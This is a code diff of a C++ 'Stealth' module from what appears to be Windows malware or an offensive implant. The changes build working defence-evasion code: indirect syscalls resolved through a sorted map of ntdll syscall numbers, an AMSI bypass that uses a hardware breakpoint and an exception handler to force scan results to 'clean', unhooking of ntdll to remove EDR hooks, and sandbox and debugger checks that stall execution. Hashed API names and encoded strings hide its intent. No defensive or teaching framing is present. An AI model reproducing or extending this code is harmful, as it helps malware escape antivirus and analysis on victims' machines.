@@ -1,8 +1,10 @@
 #include "Stealth.h"
+#include "Logger.h"
 #include <winternl.h>
 #include <intrin.h>
 #include <vector>
 #include <ctype.h>
+#include <algorithm>
 #include <tlhelp32.h>
 #include "Obfuscator.h"
 
@@ -58,26 +60,48 @@ namespace Stealth {
         PDWORD functions = (PDWORD)(base + exportDir->AddressOfFunctions);
         PWORD ordinals = (PWORD)(base + exportDir->AddressOfNameOrdinals);
         for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
-            if (HashApi((const char*)(base + names[i])) == funcHash)
-                return (FARPROC)(base + functions[ordinals[i]]);
+            const char* name = (const char*)(base + names[i]);
+            if (HashApi(name) == funcHash) return (FARPROC)(base + functions[ordinals[i]]);
+            if (name[0] == 'Z' && name[1] == 'w' && HashApi(("Nt" + std::string(name + 2)).c_str()) == funcHash) return (FARPROC)(base + functions[ordinals[i]]);
+            if (name[0] == 'N' && name[1] == 't' && HashApi(("Zw" + std::string(name + 2)).c_str()) == funcHash) return (FARPROC)(base + functions[ordinals[i]]);
         }
         return nullptr;
     }
 
-    WORD GetSSNByHash(DWORD funcHash) {
+    struct SSN_MAP_ENTRY { DWORD hash; WORD ssn; PVOID address; };
+    std::vector<SSN_MAP_ENTRY> g_ssnMap;
+
+    void BuildSSNMap() {
+        if (!g_ssnMap.empty()) return;
         HMODULE hNtdll = GetModuleByHash(Hashes::ntdll);
-        PVOID pFunc = (PVOID)GetApiByHash(hNtdll, funcHash);
-        if (!pFunc) return 0;
-        PBYTE pFuncByte = (PBYTE)pFunc;
-        for (int i = 0; i < 32; i++) {
-            if (pFuncByte[i] == 0xB8) return *(PWORD)(pFuncByte + i + 1);
+        if (!hNtdll) return;
+        PBYTE base = (PBYTE)hNtdll;
+        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + dos->e_lfanew);
+        PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+        PDWORD names = (PDWORD)(base + exports->AddressOfNames);
+        PDWORD functions = (PDWORD)(base + exports->AddressOfFunctions);
+        PWORD ordinals = (PWORD)(base + exports->AddressOfNameOrdinals);
+        for (DWORD i = 0; i < exports->NumberOfNames; i++) {
+            const char* name = (const char*)(base + names[i]);
+            if (name[0] == 'Z' && name[1] == 'w') {
+                PVOID addr = (PVOID)(base + functions[ordinals[i]]);
+                if (*((PBYTE)addr) == 0x4C && *((PBYTE)addr + 3) == 0xB8) {
+                    g_ssnMap.push_back({ HashApi(name), 0, addr });
+                    g_ssnMap.push_back({ HashApi(("Nt" + std::string(name + 2)).c_str()), 0, addr });
+                }
+            }
         }
-        for (int i = 1; i < 500; i++) {
-            PBYTE pPrev = pFuncByte - (i * 32);
-            if (*pPrev == 0x4C && *(pPrev + 3) == 0xB8) return *(PWORD)(pPrev + 4) + i;
-            PBYTE pNext = pFuncByte + (i * 32);
-            if (*pNext == 0x4C && *(pNext + 3) == 0xB8) return *(PWORD)(pNext + 4) - i;
+        std::sort(g_ssnMap.begin(), g_ssnMap.end(), [](const SSN_MAP_ENTRY& a, const SSN_MAP_ENTRY& b) { return a.address < b.address; });
+        for (WORD i = 0, ssn = 0; i < (WORD)g_ssnMap.size(); i++) {
+            if (i > 0 && g_ssnMap[i].address != g_ssnMap[i-1].address) ssn++;
+            g_ssnMap[i].ssn = ssn;
         }
+    }
+
+    WORD GetSSNByHashSilent(DWORD funcHash) {
+        BuildSSNMap();
+        for (auto& entry : g_ssnMap) { if (entry.hash == funcHash) return entry.ssn; }
         return 0;
     }
 
@@ -88,9 +112,7 @@ namespace Stealth {
         PIMAGE_SECTION_HEADER text = IMAGE_FIRST_SECTION(nt);
         PBYTE start = (PBYTE)hNtdll + text->VirtualAddress;
         PBYTE end = start + text->Misc.VirtualSize;
-        for (PBYTE p = start; p < end - 2; p++) {
-            if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) return (PVOID)p;
-        }
+        for (PBYTE p = start; p < end - 2; p++) { if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) return (PVOID)p; }
         return nullptr;
     }
 
@@ -103,11 +125,14 @@ namespace Stealth {
         if (CALL_API(Hashes::kernel32, Hashes::Thread32First, Thread32First, hSnap, &te)) {
             do {
                 if (te.th32OwnerProcessID == pid && te.th32ThreadID != tid) {
-                    HANDLE hThread = (HANDLE)CALL_API(Hashes::kernel32, Hashes::OpenProcess, OpenProcess, THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
-                    if (hThread) {
-                        if (suspend) CALL_API(Hashes::kernel32, Hashes::SuspendThread, SuspendThread, hThread);
-                        else CALL_API(Hashes::kernel32, Hashes::ResumeThread, ResumeThread, hThread);
-                        CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, hThread);
+                    auto pOpenThread = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))GetApiByHash(GetModuleByHash(Hashes::kernel32), Hashes::OpenThread);
+                    if (pOpenThread) {
+                        HANDLE hThread = pOpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
+                        if (hThread) {
+                            if (suspend) CALL_API(Hashes::kernel32, Hashes::SuspendThread, SuspendThread, hThread);
+                            else CALL_API(Hashes::kernel32, Hashes::ResumeThread, ResumeThread, hThread);
+                            CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, hThread);
+                        }
                     }
                 }
             } while (CALL_API(Hashes::kernel32, Hashes::Thread32Next, Thread32Next, hSnap, &te));
@@ -115,33 +140,51 @@ namespace Stealth {
         CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, hSnap);
     }
 
-    #ifdef _WIN64
-    extern "C" NTSTATUS IndirectSyscall(WORD ssn, PVOID gadget, ...);
-    #endif
-
-    void BypassAMSI() {
-        HMODULE hKernel32 = GetModuleByHash(Hashes::kernel32);
-        auto pLoadLibraryW = (HMODULE(WINAPI*)(LPCWSTR))GetApiByHash(hKernel32, Hashes::LoadLibraryW);
-        if (!pLoadLibraryW) return;
-        HMODULE hAmsi = pLoadLibraryW(DecryptInternal({0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c}, 0x00).c_str());
-        if (!hAmsi) return;
-        void* pScanBuffer = (void*)GetApiByHash(hAmsi, HashApi("AmsiScanBuffer"));
-        if (!pScanBuffer) return;
-        WORD ssnProtect = GetSSNByHash(Hashes::NtProtectVirtualMemory);
-        PVOID gadget = GetSyscallGadget();
-        if (ssnProtect && gadget) {
-            DWORD oldProtect; PVOID base = pScanBuffer; SIZE_T size = 16;
-            #ifdef _WIN64
-            if (IndirectSyscall(ssnProtect, gadget, (HANDLE)-1, &base, &size, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
-                unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-                memcpy(pScanBuffer, patch, sizeof(patch));
-                IndirectSyscall(ssnProtect, gadget, (HANDLE)-1, &base, &size, oldProtect, &oldProtect);
+    LONG CALLBACK StealthVEH(PEXCEPTION_POINTERS ExceptionInfo) {
+        if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
+             HMODULE hAmsi = GetModuleByHash(Hashes::amsi);
+             FARPROC pAmsiScan = GetApiByHash(hAmsi, HashApi("AmsiScanBuffer"));
+            if (ExceptionInfo->ContextRecord->Rip == (DWORD64)pAmsiScan) {
+                PVOID pResult = *(PVOID*)(ExceptionInfo->ContextRecord->Rsp + 48);
+                if (pResult) *(DWORD*)pResult = 0; // AMSI_RESULT_CLEAN
+                ExceptionInfo->ContextRecord->Rax = 0; // S_OK
+                ExceptionInfo->ContextRecord->Rip = *(PDWORD64)ExceptionInfo->ContextRecord->Rsp;
+                ExceptionInfo->ContextRecord->Rsp += 8;
+                return EXCEPTION_CONTINUE_EXECUTION;
             }
-            #endif
+        }
+        return EXCEPTION_CONTINUE_SEARCH;
+    }
+
+    bool SetHardwareBreakpoint(PVOID address, int registerIndex) {
+        CONTEXT ctx = { 0 }; ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        HANDLE hThread = (HANDLE)CALL_API(Hashes::kernel32, Hashes::GetCurrentThread, GetCurrentThread);
+        if (CALL_API(Hashes::kernel32, Hashes::GetThreadContext, GetThreadContext, hThread, &ctx)) {
+            switch (registerIndex) {
+                case 0: ctx.Dr0 = (DWORD64)address; break;
+                case 1: ctx.Dr1 = (DWORD64)address; break;
+                case 2: ctx.Dr2 = (DWORD64)address; break;
+                case 3: ctx.Dr3 = (DWORD64)address; break;
+            }
+            ctx.Dr7 |= (1ULL << (2 * registerIndex));
+            return (bool)CALL_API(Hashes::kernel32, Hashes::SetThreadContext, SetThreadContext, hThread, &ctx);
+        }
+        return false;
+    }
+
+    void BypassAMSI_Silent() {
+        HMODULE hAmsi = (HMODULE)CALL_API(Hashes::kernel32, Hashes::LoadLibraryW, LoadLibraryW, DecryptInternal({0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c}, 0x00).c_str());
+        if (!hAmsi) return;
+        PVOID pScanBuffer = (PVOID)GetApiByHash(hAmsi, HashApi("AmsiScanBuffer"));
+        if (!pScanBuffer) return;
+        auto pAddVEH = (PVOID(WINAPI*)(ULONG, PVECTORED_EXCEPTION_HANDLER))GetApiByHash(GetModuleByHash(Hashes::kernel32), Hashes::AddVectoredExceptionHandler);
+        if (pAddVEH) {
+            pAddVEH(1, StealthVEH);
+            SetHardwareBreakpoint(pScanBuffer, 0);
         }
     }
 
-    void UnhookNtdll() {
+    void UnhookNtdll_Silent() {
         HMODULE hKernel32 = GetModuleByHash(Hashes::kernel32);
         HMODULE hNtdll = GetModuleByHash(Hashes::ntdll);
         if (!hKernel32 || !hNtdll) return;
@@ -150,9 +193,9 @@ namespace Stealth {
         std::wstring path = DecryptInternal({0x43, 0x3a, 0x5c, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x5c, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33, 0x32, 0x5c, 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c}, 0x00);
         HANDLE hFile = pCreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
         if (hFile == INVALID_HANDLE_VALUE) return;
-        WORD ssnCreateSection = GetSSNByHash(Hashes::NtCreateSection);
-        WORD ssnMapView = GetSSNByHash(Hashes::NtMapViewOfSection);
-        WORD ssnProtect = GetSSNByHash(Hashes::NtProtectVirtualMemory);
+        WORD ssnProtect = GetSSNByHashSilent(Hashes::NtProtectVirtualMemory);
+        WORD ssnMapView = GetSSNByHashSilent(Hashes::NtMapViewOfSection);
+        WORD ssnCreateSection = GetSSNByHashSilent(Hashes::NtCreateSection);
         PVOID gadget = GetSyscallGadget();
         if (ssnCreateSection && ssnMapView && gadget) {
             HANDLE hSection = NULL;
@@ -182,8 +225,26 @@ namespace Stealth {
         CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, hFile);
     }
 
+    bool IsBeingAnalyzed() {
+        HMODULE hKernel32 = GetModuleByHash(Hashes::kernel32);
+        auto pIsDebuggerPresent = (BOOL(WINAPI*)())GetApiByHash(hKernel32, Hashes::IsDebuggerPresent);
+        if (pIsDebuggerPresent && pIsDebuggerPresent()) return true;
+        SYSTEM_INFO si;
+        auto pGetSystemInfo = (void(WINAPI*)(LPSYSTEM_INFO))GetApiByHash(hKernel32, Hashes::GetSystemInfo);
+        if (pGetSystemInfo) { pGetSystemInfo(&si); if (si.dwNumberOfProcessors < 2) return true; }
+        MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
+        auto pGlobalMemoryStatusEx = (BOOL(WINAPI*)(LPMEMORYSTATUSEX))GetApiByHash(hKernel32, Hashes::GlobalMemoryStatusEx);
+        if (pGlobalMemoryStatusEx && pGlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < (3ULL * 1024 * 1024 * 1024)) return true;
+        return false;
+    }
+
     void Initialize() {
-        UnhookNtdll();
-        BypassAMSI();
+        UnhookNtdll_Silent();
+        BypassAMSI_Silent();
+        if (IsBeingAnalyzed()) {
+            HMODULE hKernel32 = GetModuleByHash(Hashes::kernel32);
+            auto pSleep = (void(WINAPI*)(DWORD))GetApiByHash(hKernel32, Hashes::Sleep);
+            while (true) if (pSleep) pSleep(10000); else break;
+        }
     }
 }
